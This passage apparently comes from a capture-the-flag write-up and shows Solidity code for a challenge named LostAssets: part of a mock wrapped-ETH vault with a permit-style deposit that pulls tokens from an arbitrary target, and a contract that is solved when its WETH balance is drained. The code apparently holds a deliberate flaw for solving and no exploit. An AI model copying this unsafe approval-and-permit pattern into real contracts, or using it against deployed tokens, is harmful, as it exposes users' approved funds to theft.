            r,
            s
        );
        IERC20(underlying).safeTransferFrom(target, address(this), value);
        return _deposit(value, to);
    }

    function _deposit(uint256 value, address to) internal returns (uint256) {
        _mint(to, value);
        return value;
    }

    /// @notice withdraw all
    function withdraw() external returns (uint256) {
        return _withdraw(msg.sender, balanceOf(msg.sender), msg.sender);
    }

    /// @notice withdraw specified `amount`
    function withdraw(uint256 amount) external returns (uint256) {
        return _withdraw(msg.sender, amount, msg.sender);
    }

    function _withdraw(
        address from,
        uint256 amount,
        address to
    ) internal returns (uint256) {
        _burn(from, amount);
        IERC20(underlying).safeTransfer(to, amount);
        return amount;
    }
}

contract LostAssets {
    MockWETH public WETH;
    MocksWETH public sWETH;

    constructor() payable {
        require(msg.value >= 1 ether, "At least 1 ether");

        WETH = new MockWETH();
        sWETH = new MocksWETH(address(WETH));

        WETH.deposit{value: msg.value}();
        // Guaranteed interchangeability of WETH and sWETH
        WETH.approve(address(sWETH), type(uint256).max);
        // sWETH.approve(address(WETH), type(uint256).max); // WETH cannot use approval
        // Deposit half of weth balance
        sWETH.deposit(msg.value / 2);
    }

    function isComplete() public view returns (bool) {
        require(WETH.balanceOf(address(this)) == 0);
        return true;
    }
}
<p>根据题目:</p>
</code></pre>
  </body>
</html>
